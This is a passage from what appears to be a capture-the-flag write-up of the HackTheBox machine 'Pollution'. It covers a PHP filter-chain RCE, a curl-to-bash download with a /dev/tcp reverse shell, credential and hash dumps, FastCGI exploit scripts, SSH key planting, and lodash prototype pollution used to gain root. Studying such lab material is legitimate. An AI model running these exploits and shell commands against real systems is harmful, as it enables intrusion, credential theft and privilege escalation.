921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

```

I’ll need to add `0=id` to the URL GET parameters and it will execute `id`:

![image-20230628174159373](/img/image-20230628174159373.png)

I’ll replace `id` with `curl 10.10.14.6/s|bash`:

![image-20230628174501412](/img/image-20230628174501412.png)

It hits my server:

```
10.10.11.192 - - [27/Jun/2023 20:31:03] code 404, message File not found
10.10.11.192 - - [27/Jun/2023 20:31:03] "GET /s HTTP/1.1" 404 -

```

I’ll create `s` in my web directory:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

And refresh Firefox. It gets `s` and then there’s a reverse shell at my `nc` listener:

```

oxdf@hacky$ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.192 39034
bash: cannot set terminal process group (974): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pollution:~/developers$ 

```

I’ll use the `script` / `stty` [trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q) to upgrade my shell:

```

www-data@pollution:~/developers$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@pollution:~/developers$ ^Z
[1]+  Stopped                 nc -lvnp 443
oxdf@hacky$ stty raw -echo; fg
nc -lvnp 443
            reset
reset: unknown terminal type unknown 
Terminal type? screen
www-data@pollution:~/developers$

```

## Shell as victor

### Enumeration

#### Home Directories

There’s only one user with a directory in `/home`:

```

www-data@pollution:/home$ ls
victor
www-data@pollution:/home$ cd victor/
bash: cd: victor/: Permission denied

```

#### Web

All three sites connect o MySQL using the credentials webapp\_user / Str0ngP4ssw0rdB\*12@1:
- `collect` - `config.php` has creds for db named `webapp`
- `developers` - `login.php` has creds for db named `developers`
- `forum` - `inc/config.php` has creds for db named `forum`

I’ll take a look through these DBs, but there’s not much of interest. Both `webapp` and `developers` have a `users` table with an admin user with the hash c89efc49ddc58ee4781b02becc788d14. I can tell from my own hash in that table that these are unsalted MD5 hashes. But this hash doesn’t crack to anything.

There are seven other users in the `mybb_users` table in `forum`. It’s using some kind of salted MD5.

```

MariaDB [forum]> select uid,username,password,salt from mybb_users; 
+-----+---------------------+----------------------------------+----------+
| uid | username            | password                         | salt     |
+-----+---------------------+----------------------------------+----------+
|   1 | administrator_forum | b254efc2c5716af2089ffeba1abcbf30 | DFFbL50R |
|   2 | john                | e1ec52d73242b78fdee6be117569b602 | UsWOsbCe |
|   3 | victor              | b454fd07d44b27f1d528efba841c9717 | Guls6xA8 |
|   4 | sysadmin            | 477a429cddfc475b9100958cae9204b1 | 3aUhiPN0 |
|   5 | jeorge              | 5d13d9d4b1f368280b8426800a85702e | 7HINOv17 |
|   8 | lyon                | 5eab3ec757f8352597ab74361fda8bcc | glx7Hpzh |
|   6 | jane                | 972470c4c1a3f53029e56007abcf39fc | YGjmCmvg |
|   7 | karldev             | 285127d01d188c8827c9fded33bf6f9e | KUWyAcfh |
|   9 | 0xdf                | 2d80c111e62a29b9dcc0104b3e06df15 | 0m9qY5r2 |
+-----+---------------------+----------------------------------+----------+
9 rows in set (0.001 sec)

```

I’ll go down a bit of a rabbit hole to figure out that these hashes are of the form `md5(md5([salt]).md5([password]))`. This is actually [mode 2811](https://hashcat.net/wiki/doku.php?id=example_hashes) in Hashcat, but none of these crack (creating a user with password “password”, dumping the hash and salt, and running that through `hashcat` verifies this works).

There is one other DB of interest, `pollution_api`:

```

MariaDB [forum]> show databases;
+--------------------+
| Database           |
+--------------------+
| developers         |
| forum              |
| information_schema |
| mysql              |
| performance_schema |
| pollution_api      |
| webapp             |
+--------------------+
7 rows in set (0.001 sec)

```

It has two tables. `messages` is empty, and `users` has only the user I created by the admin on the webpage while doing XXE:

```

MariaDB [forum]> use pollution_api
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [pollution_api]> show tables;
+-------------------------+
| Tables_in_pollution_api |
+-------------------------+
| messages                |
| users                   |
+-------------------------+
2 rows in set (0.001 sec)

MariaDB [pollution_api]> select * from messagesl;
ERROR 1146 (42S02): Table 'pollution_api.messagesl' doesn't exist
MariaDB [pollution_api]> select * from messages; 
Empty set (0.001 sec)

MariaDB [pollution_api]> select * from users;   
+----+----------+----------+------+---------------------+---------------------+
| id | username | password | role | createdAt           | updatedAt           |
+----+----------+----------+------+---------------------+---------------------+
|  1 | 0xdf     | 0xdf     | user | 2023-06-28 19:44:06 | 2023-06-28 19:44:06 |
+----+----------+----------+------+---------------------+---------------------+
1 row in set (0.000 sec)

```

#### victor’s php-fpm

Looking at the process list, there are only two processes running as victor:

```

victor      1100  0.0  0.3 265840 15712 ?        S    Jun27   0:00 php-fpm: pool victor
victor      1103  0.0  0.3 265840 15712 ?        S    Jun27   0:00 php-fpm: pool victor

```

There’s a master fpm process that gives the config location:

```

www-data@pollution:~$ ps auxww | grep fpm                                         
root         974  0.0  1.0 265400 40936 ?        Ss   Jun27   0:14 php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)
victor      1100  0.0  0.3 265840 15712 ?        S    Jun27   0:00 php-fpm: pool victor
victor      1103  0.0  0.3 265840 15712 ?        S    Jun27   0:00 php-fpm: pool victor
www-data    7735  0.0  0.8 345248 34156 ?        S    Jun28   0:00 php-fpm: pool www
www-data    7736  0.0  0.8 344700 34628 ?        S    Jun28   0:00 php-fpm: pool www
www-data    7737  0.0  0.8 344424 34140 ?        S    Jun28   0:00 php-fpm: pool www
www-data   11119  0.0  0.7 266276 29216 ?        S    02:29   0:00 php-fpm: pool www
www-data   11251  0.0  0.7 265968 28468 ?        S    02:39   0:00 php-fpm: pool www

```

That files shows two configurations, one as victor and one as www-data:

```

www-data@pollution:~$ cat /etc/php/8.1/fpm/pool.d/www.conf | grep -v '^;' | grep .
[victor]
user = victor
group = victor
listen = 127.0.0.1:9000
listen.owner = www-data
listen.group = www-data
pm = dynamic
pm.max_children = 5
pm.start_servers = 2
pm.min_spare_servers = 1
pm.max_spare_servers = 3
[www]
user = www-data
group = www-data
listen = /run/php/php8.1-fpm.sock
listen.owner = www-data
listen.group = www-data
pm = dynamic
pm.max_children = 5
pm.start_servers = 2
pm.min_spare_servers = 1
pm.max_spare_servers = 3

```

The victor one is listening on port 9000.

### FPM

#### Background

FPM is the FastCGI Process Manager. FastCGI is a protocol implementation like CGI (Common Gateway Interface), designed to connect web requests to executables / scripts.

It isn’t clear what legit purpose victor has for running fpm. I don’t see a scripts directory or anything available on 9000.

#### POC

HackTricks has a nice page on [Pentesting FastCGI](https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi?ref=hacktrickz.xyz). It gives the following script, as well as a link to [this Python script](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75):

```

#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/var/www/public/index.php" # Existing file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done

```

I’ll copy the shell script to Pollution as `/dev/shm/ex.sh`. I need to change the `FILENAMES` variable to something that exists. I’ll use `/var/www/developers/index.php`. I’ll also change `whoami` to `id` because I think the output is more obvious.

With no other changes, I’ll run it:

```

www-data@pollution:/dev/shm$ bash ex.sh localhost
Status: 302 Found
Set-Cookie: PHPSESSID=n4ocmpe5i6na46bgdlm8g4h929; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /login.php
Content-type: text/html; charset=UTF-8

<!--uid=1002(victor) gid=1002(victor) groups=1002(victor)
-->

```

It returns the output of `id` as victor!

#### Update Script

I’ll update the script to always go for localhost, and use the first argument as the command to run:

```

#!/bin/bash

PAYLOAD="<?php echo '<!--'; system(\"$1\"); echo '-->' . \"\n\";"
FILENAMES="/var/www/developers/index.php" # Existing file path

HOST="localhost"
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done

```

I’ll have to change the speechmarks around a bit to allow for `$1` to be processed as a variable. I’ll also add a trailing newline in the output. It works, reading victor’s home directory:

```

www-data@pollution:/dev/shm$ bash ex.sh "ls -la ~" 
Status: 302 Found
Set-Cookie: PHPSESSID=uul95tosrmr8ktqlo99gq23a7r; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /login.php
Content-type: text/html; charset=UTF-8

<!--total 80
drwx------ 16 victor victor 4096 Jun 28 15:51 .
drwxr-xr-x  3 root   root   4096 Nov 21  2022 ..
lrwxrwxrwx  1 victor victor    9 Nov 21  2022 .bash_history -> /dev/null
-rw-r--r--  1 victor victor 3526 Mar 27  2022 .bashrc
drwxr-xr-x 12 victor victor 4096 Nov 21  2022 .cache
drwx------ 11 victor victor 4096 Nov 21  2022 .config
drwx------  2 victor victor 4096 Dec  5  2022 .gnupg
drwxr-xr-x  3 victor victor 4096 Nov 21  2022 .local
-rw-r--r--  1 victor victor  807 Mar 27  2022 .profile
-rw-------  1 victor victor    9 Jun 28 15:51 .python_history
lrwxrwxrwx  1 root   root      9 Oct 27  2022 .rediscli_history -> /dev/null
drwx------  2 victor victor 4096 Nov 21  2022 .ssh
drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Desktop
drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Documents
drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Downloads
drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Music
drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Pictures
drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Public
drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Templates
drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Videos
drwxr-xr-x  8 victor victor 4096 Nov 21  2022 pollution_api
-rw-r-----  1 root   victor   33 Jun 27 18:37 user.txt
-->

```

#### Write SSH Key

Given the access to victor, I’ll write my SSH public key into `~/.ssh/authorized_keys`. The file doesn’t exist right now, so I don’t have to worry about overwriting anything:

```

www-data@pollution:/dev/shm$ bash ex.sh "ls -la ~/.ssh"
Status: 302 Found
Set-Cookie: PHPSESSID=kjhk4o415osmifepdfecj8q1ar; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /login.php
Content-type: text/html; charset=UTF-8

<!--total 8
drwx------  2 victor victor 4096 Nov 21  2022 .
drwx------ 16 victor victor 4096 Jun 28 15:51 ..
-->

```

I’ll write my key, and it seems to work:

```

www-data@pollution:/dev/shm$ bash ex.sh "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing' > ~/.ssh/authorized_keys"
Status: 302 Found
Set-Cookie: PHPSESSID=7ogec5iiqta7kpgdsffllfmq09; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /login.php
Content-type: text/html; charset=UTF-8

<!---->
www-data@pollution:/dev/shm$ bash ex.sh "ls -la ~/.ssh"                                                                                                                  
Status: 302 Found
Set-Cookie: PHPSESSID=l9pud93ittdogopgihh659v8p3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /login.php
Content-type: text/html; charset=UTF-8

<!--total 12
drwx------  2 victor victor 4096 Jun 29 03:20 .
drwx------ 16 victor victor 4096 Jun 28 15:51 ..
-rw-r--r--  1 victor victor   96 Jun 29 03:20 authorized_keys
-->

```

### SSH

With my public key in `authorized_keys`, I can connect over SSH:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen victor@collect.htb
Linux pollution 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
...[snip]...
victor@pollution:~$

```

And fetch `user.txt`:

```

victor@pollution:~$ cat user.txt
1352844a************************

```

## Shell as root

### Enumeration - pollution\_api

In victor’s home directory there is a folder named `pollution_api`:

```

victor@pollution:~$ ls
Desktop  Documents  Downloads  Music  Pictures  pollution_api  Public  Templates  user.txt  Video

```

It contains a NodeJS application:

```

victor@pollution:~/pollution_api$ ls
controllers  functions  index.js  logs  log.sh  models  node_modules  package.json  package-lock.json  routes

```

`index.js` shows it uses the [Express framework](https://expressjs.com/), and is listening on port 3000:

```

const express = require('express');
const app = express();
const bodyParser = require('body-parser');

app.use(bodyParser.json());

app.get('/',(req,res)=>{
    res.json({Status: "Ok", Message: 'Read documentation from api in /documentation'});
})

app.use('/auth',require('./routes/auth'));
app.use('/client',require('./routes/client'));
app.use('/admin',require('./routes/admin'));
app.use('/documentation',require('./routes/documentation'));

app.listen(3000, '127.0.0.1');
console.log('Listen on http://localhost:3000');

```

It has a default message for `/` which talks about `/documentation`, and it imports routes from four other directories.

The application is running:

```

victor@pollution:~/pollution_api$ curl localhost:3000
{"Status":"Ok","Message":"Read documentation from api in /documentation"}

```

In fact, it’s running as root:

```

victor@pollution:~/pollution_api$ ps auxww | grep node
root        1346  0.0  2.0 1680660 80304 ?       Sl   Jun27   0:01 /usr/bin/node /root/pollution_api/index.js

```

I’ll also reconnect my SSH session with `-L 3000:localhost:3000` so that 3000 on my VM now accesses this new API:

```

oxdf@hacky$ curl localhost:3000
{"Status":"Ok","Message":"Read documentation from api in /documentation"}

```

### Source Code Analysis

#### Exfil

To analyze it more easily, I’ll exfil the source to my VM. I’ll create an archive on Pollution:

```

victor@pollution:~$ tar zcf api.tar.gz pollution_api/

```

From my VM, I’ll copy it back with `scp`:

```

oxdf@hacky$ scp -i ~/keys/ed25519_gen victor@collect.htb:api.tar.gz .
api.tar.gz                                                       100% 4505KB   4.6MB/s   00:00

```

I’ll decompress it and the files are there:

```

oxdf@hacky$ tar xf api.tar.gz 
oxdf@hacky$ ls pollution_api/
controllers  functions  index.js  logs  log.sh  models  node_modules  package.json  package-lock.json  routes

```

#### Snyk

Opening the directory in VSCode, the Synk plugin identifies 43 issues in the code, as well as 16 vulnerabilities in imported libraries and their version (in the “Open Source Security” section):

![image-20230629040444013](/img/image-20230629040444013.png)

I’m particularly interested in the Command Injection (because that’s code execution) and Prototype Pollution (because it matches the box name) vulnerabilities. The command injection vulnerability is in the `template` call, where as the different prototype pollution vulns call out functions like `defaultsDeep`, `zipObjectDeep`, `setWith`, `set`, `merge`, and `mergeWidth`. I’ll keep an eye out for all of those in this code.

I’ll want to triage the Code Security vulnerabilities as well, but I should understand the code first.

#### Routes

I noted above that four `.js` files from `routes` were used as routes in `index.js`. `documentation.js` has a single endpoint, `/` (which is in the `/documentation` route, so really `/documentation/`) that returns the various endpoints on the API.

Requesting `/documentation` or reading the source shows static JSON describing the other routes on the API:

| Route | Method | Parameters |
| --- | --- | --- |
| `/` | GET | None |
| `/auth/register` | POST | `username`, `password` |
| `/auth/login` | POST | `username`, `password` |
| `/client` | POST\* | None |
| `/admin/messages` | POST | `id` |
| `/admin/messages/send` | POST | `text` |

`*` The documentation says this is a GET, but in the source it’s a POST.

These are only the documentated endpoints. There could be others (such as `/documentation`) that are not included in this response. In this case, on looking through the source, nothing else is unaccounted for.

#### /client

`/client` has two functions. The first is a `router.use`, which is middlewear that runs on all routes in this section. It effectively checks that there is a JWT in the `x-access-token` header, and that the username and role in that token matches what’s in the database.

The second function is `router.post` for `/`, and it just returns a message saying it’s not implemented:

```

router.post('/',(req,res)=>{
    res.json({Status: "Ok", Message: 'This route is under development'});
})

```

Nothing too interesting here.

#### /auth

There’s a POST to `/auth/register` that makes sure there the username and password are filled in, and then queries for any user with that username. If it’s not found, it creates the user and calls a shell script:

```

const find = await User.findAll({where: {username: req.body.username}})
if(find.length == 0){

    User.create({
        username: req.body.username,
        password: req.body.password,
        role: "user"
    });

    exec('/home/victor/pollution_api/log.sh log_register');
    return res.json({Status: "Ok"});
}

```

`exec` seems risky, but there’s nothing I control going into it. Looking at the script, it doesn’t seem vulnerable:

```

elif [ $1 == 'log_register' ]
then

    date=$(date '+%d-%m-%Y-%H:%M:%S');
    echo "New registered user! $date" > /home/victor/pollution_api/logs/register/log-$date.log

```

If I could mess with the path, I could hijack `date`, but I don’t see a way to do that.

The other endpoint is `/auth/login`, which after some error checking, queries if the username and password match, and if so, create a JWT and return it:

```

const find = await User.findAll({where: {username: req.body.username, password: req.body.password}});
if(find.length > 0){

    exec('/home/victor/pollution_api/log.sh log_login');

    const token = signtoken({user: find[0].username, is_auth: true, role: find[0].role});
    return res.json({
        Status: "Ok",
        Header: {
            "x-access-token": token
        }
    });
}

```

`sigtoken` is imported at the top:

```

const { signtoken } = require('../functions/jwt')

```

In the `functions/jwt.js` file is the signing key as well as the functions:

```

const jwt = require('jsonwebtoken');
const SECRET = "JWT_COLLECT_124_SECRET_KEY"

const signtoken = (payload)=>{
    const token = jwt.sign(payload, SECRET, { expiresIn: 3600 });
    return token;
}

const decodejwt = (token)=>{
    return jwt.verify(token, SECRET, (err, decoded)=>{
        if(err) return false;
        return decoded;
    });
}

module.exports = { signtoken, decodejwt};

```

I can generate and sign my own tokens. But I also already have DB access or can register, so nothing too fancy there.

#### /admin

The `admin.js` file has middleware that will decode the JWT, make sure the user exists and the role matches, and make sure role is “admin”, or else (not shown) throw an error:

```

router.use('/', async(req,res,next)=>{
    if(req.headers["x-access-token"]){

        const token = decodejwt(req.headers["x-access-token"]);
        if(token){
            const find = await User.findAll({where: {username: token.user, role: token.role}});
            
            if(find.length > 0){

                if(find[0].username == token.user && find[0].role == token.role && token.role == "admin"){

                    return next();

                }

```

It’s actually quite odd to be checking the role in the DB when it’s already in the token. This kind of check is redundant.

There is a `/admin` endpoint that just refers to `/documentation`. The two `messages` endpoints are referenced from another file:

```

router.get('/',(req,res)=>{
    res.json({Status: "Ok", Message: 'Read documentation from api in /documentation'});
})

router.post('/messages',messages);
router.post('/messages/send', messages_send);

```

`messages` and `messages_send` are imported at the top:

```

const { messages } = require('../controllers/Messages');
const { messages_send } = require('../controllers/Messages_send');

```

`messages` basically checks if there’s an `id` submitted, and if so, finds that message and returns it:

```

const messages = async(req,res)=>{
    if(req.body.id){
        const find = await Message.findAll({where: {id: req.body.id}});
        const message = find.map((message)=>{
            return {
                ID: message.id,
                Message: JSON.parse(message.text)
            };
        })
        return res.json(message);
    }

```

Otherwise, it finds all the messages and returns them:

```

const messages = async(req,res)=>{
    if(req.body.id){
        const find = await Message.findAll({where: {id: req.body.id}});
        const message = find.map((message)=>{
            return {
                ID: message.id,
                Message: JSON.parse(message.text)
            };
        })
        return res.json(message);
    }

    const find = await Message.findAll({ raw: true });
    const message = find.map((message)=>{
        return {
            ID: message.id,
            Message: JSON.parse(message.text)
        };
    })
    return res.json(message);
    
}

```

`messages_send` uses the token to get the user for the data. Then it merges the request body into the message.

```

const messages_send = async(req,res)=>{
    const token = decodejwt(req.headers['x-access-token'])
    if(req.body.text){

        const message = {
            user_sent: token.user,
            title: "Message for admins",
        };

        _.merge(message, req.body);

        exec('/home/victor/pollution_api/log.sh log_message');

        Message.create({
            text: JSON.stringify(message),
            user_sent: token.user
        });

        return res.json({Status: "Ok"});

    }

    return res.json({Status: "Error", Message: "Parameter text not found"});
}

```

That `merge` call is from `lodash` (which is imported as `_`), and one of the functions identify by Snyk as having the prototype pollution. This is likely the point of attack (and why it’s useful to know what vulnerabilities I’m looking for before looking at the code).

### Access to Admin APIs

#### Register User

If I try to register the 0xdf user, it actually complains because I registered it earlier while looking at the XXE:

```

oxdf@hacky$ curl -H "Content-type: application/json" -d '{"username":"0xdf", "password":"0xdf"}' localhost:3000/auth/register
{"Status":"This user already exists"}

```

I’ll login:

```

oxdf@hacky$ curl -H "Content-type: application/json" -d '{"username":"0xdf", "password":"0xdf"}' localhost:3000/auth/login
{"Status":"Ok","Header":{"x-access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiMHhkZiIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjg4MDY0NDMxLCJleHAiOjE2ODgwNjgwMzF9.5vDuyl04aXgKbnQj1LQKZKdNOGxvuTgpW6wCfzWcVHs"}}

```

If I drop that token in [JWT.io](https://jwt.io/), it shows the role as “user”:

![image-20230629144904693](/img/image-20230629144904693.png)

#### Escalate to Admin

From my shell as victor, I’ll log into MySQL using the creds I found earlier:

```

victor@pollution:~$ mysql -u webapp_user -pStr0ngP4ssw0rdB*12@1 pollution_api
...[snip]...
MariaDB [pollution_api]>

```

There’s only me in the `users` table:

```

MariaDB [pollution_api]> select * from users;
+----+----------+----------+------+---------------------+---------------------+
| id | username | password | role | createdAt           | updatedAt           |
+----+----------+----------+------+---------------------+---------------------+
|  1 | 0xdf     | 0xdf     | user | 2023-06-28 19:44:06 | 2023-06-28 19:44:06 |
+----+----------+----------+------+---------------------+---------------------+
1 row in set (0.000 sec)

```

I’ll make myself an admin:

```

MariaDB [pollution_api]> update users set role = "admin" where id = 1;
Query OK, 1 row affected (0.001 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [pollution_api]> select * from users;
+----+----------+----------+-------+---------------------+---------------------+
| id | username | password | role  | createdAt           | updatedAt           |
+----+----------+----------+-------+---------------------+---------------------+
|  1 | 0xdf     | 0xdf     | admin | 2023-06-28 19:44:06 | 2023-06-28 19:44:06 |
+----+----------+----------+-------+---------------------+---------------------+
1 row in set (0.000 sec)

```

Now I’ll log in again:

```

oxdf@hacky$ curl -H "Content-type: application/json" -d '{"username":"0xdf", "password":"0xdf"}' localhost:3000/auth/login
{"Status":"Ok","Header":{"x-access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiMHhkZiIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4ODA2NDc1MywiZXhwIjoxNjg4MDY4MzUzfQ.jUzPbs0K9Egl-J8ZBJ48J1w6G4bf07WleOGfPlK57lg"}}

```

And this token shows “admin”:

![image-20230629145313135](/img/image-20230629145313135.png)

### RCE via Prototype Pollution

#### Background

The idea in a prototype pollution attack is to attack the prototype for objects. When you create a new object, it inherits from the prototype, but also carries a reference to that prototype along with it as `.__proto__`. I abused this in [2022 Hackvent Day 13](/hackvent2022/medium#hv2213) to give my user admin access.

We have this `messages` object, which is of type `object`:

```

const message = {
    user_sent: token.user,
    title: "Message for admins",
};

```

I can verify this in a browser console:

![image-20230629153908762](/img/image-20230629153908762.png)

When it calls `merge(message, req.body)`, if done unsafely, I can structure `req.body` such that it overwrites parts of `message.__proto__`, which will be the prototype definition for `object`.

Then when `exec` is called, part of what is needed is the `options` object, which is of the type `object` according to [the docs](https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback):

![image-20230629154321644](/img/image-20230629154321644.png)

So if I can pollute the `object` prototype to have a `shell` value of something else, then `exec` will run that.

One way to do this is to write a different executable to disk on Pollution and overwrite `shell` with the full path to that. Hacktricks offers a [payload](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#pp2rce-vuln-child_process-functions) is a bit slicker, as it will use the `argv0` value in the prototype as well to somehow run arbitrary Node (in ways I don’t 100% understand, but does work).

```

const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

```

#### Execute

I’ll go into Burp repeater and make a request to `localhost:3000` and build it up to interact with the API. My payload will look like this:

![image-20230629160125840](/img/image-20230629160125840.png)

`text` is just the requested parameter. Then I’m also updating the prototype with the variables from the HackTricks post. I’ve modified the `argv0` parameter to copy `bash` into `/tmp` and make it SetUID/SetGID for root.

When I send this, I reports “Ok”. And the file is there:

```

victor@pollution:~$ ls -ls /tmp/0xdf 
1208 -rwsrwsrwx 1 root root 1234376 Jun 29 15:59 /tmp/0xdf

```

I’ll run it (with `-p` to avoid dropping privs) and get a shell as root:

```

victor@pollution:~$ /tmp/0xdf -p
0xdf-5.1# id
uid=1002(victor) gid=1002(victor) euid=0(root) egid=0(root) groups=0(root),1002(victor)

```

I’ll grab the root flag:

```

0xdf-5.1# cat /root/root.txt
01175b14************************

```

## Beyond Root - Max URL Length

I was curious to play around with the maximum return on files over the XXE vulnerability. The `passwd` file is bigger than the Apache configs:

```

root@pollution:~# wc -c /etc/passwd /etc/hostname /etc/apache2/sites-enabled/*
2394 /etc/passwd
  10 /etc/hostname
1366 /etc/apache2/sites-enabled/collect.htb.conf
2218 /etc/apache2/sites-enabled/developers.collect.htb.conf
1364 /etc/apache2/sites-enabled/forum.collect.htb.conf

```

I am curious to find out the line between 2394 and 2218. I’ll add some lines of junk to the bottom of the `developers.collect.htb.conf` file:

```

root@pollution:~# tail -15 /etc/apache2/sites-enabled/developers.collect.htb.conf
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

```

Some experimenting shows that when the file is 2218 bytes it does not work, but 2217 bytes does. Now it’s not the raw file coming back as I am exfiling it, but the base64 encoded version, which will be roughly 4/3 the size. 2995 works, but 2999 fails:

```

root@pollution:~# base64 /etc/apache2/sites-enabled/developers.collect.htb.conf | wc -c
2995
root@pollution:~# echo -n "a" >> /etc/apache2/sites-enabled/developers.collect.htb.conf
root@pollution:~# base64 /etc/apache2/sites-enabled/developers.collect.htb.conf | wc -c
2999

```

It’s not super important what the exact limit is. I suspect PHP is limited at 3000 and counting perhaps the `GET`  as part of it. The important part is to know this could happen, and plan around it.

One thing I could do also is use a deflate filter before base64-encoding, which would compress the text and give me much more exfil. On the other hand, then it would be more of a pain to decode.